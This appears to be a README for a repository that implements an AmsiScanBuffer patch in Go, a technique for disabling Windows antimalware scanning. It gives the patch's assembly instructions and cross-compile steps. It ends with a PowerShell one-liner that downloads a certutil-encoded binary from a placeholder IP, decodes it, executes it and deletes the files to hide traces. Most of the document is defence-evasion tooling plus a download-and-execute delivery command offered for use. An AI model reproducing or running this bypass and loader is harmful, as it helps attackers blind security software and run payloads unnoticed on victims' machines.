# Overview 

## This repo contains a Golang implementation for a custom AmsiScanBuffer patch. I used this site to assemble the code, https://defuse.ca/online-x86-assembler.htm#disassembly.

### My implementation
- **; Clear the eax register by XORing it with itself**
- **xor eax, eax**

- **; Shift the contents of eax left by 16 bits, effectively clearing the lower 16 bits**
- **shl eax, 16**

- **; Set the lower 16 bits of eax using a bitwise OR operation with the value 0x57**
- **or ax, 0x57**

- **; Return from the subroutine**
- **ret**


# Setup 

## Install Golang 
```bash
wget https://go.dev/dl/go1.22.0.linux-amd64.tar.gz
sudo tar -C /usr/local -xvf go1.22.0.linux-amd64.tar.gz
sudo nano ~/.profile
export PATH=$PATH:/usr/local/go/bin
source ~/.profile
```

## Setup Golang Environment
```bash 
go env -w GO111MODULE=auto
```

## From within source directory 
```bash
go mod init main
go mod tidy
```

## Install compiler on Debian-based machine
```bash 
sudo apt install gcc-mingw-w64-x86-64
```
## How to compile
```bash
GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -o test.exe am_s.go
```

## Encode the binary into a text file 
```powershell
certutil -encode test.exe test.txt
```
## Execute the binary using Microsoft signed binaries
```powershell
Start-Process -FilePath curl -ArgumentList "http://<IP>/test.txt -o $($pwd.Path)\test.txt" -Wait; certutil -decode "$($pwd.Path)\test.txt" "$($pwd.Path)\test.exe"; Start-Process -FilePath "$($pwd.Path)\test.exe" -Wait; Remove-Item -Path "$($pwd.Path)\test.exe"; Remove-Item -Path "$($pwd.Path)\test.txt"
```
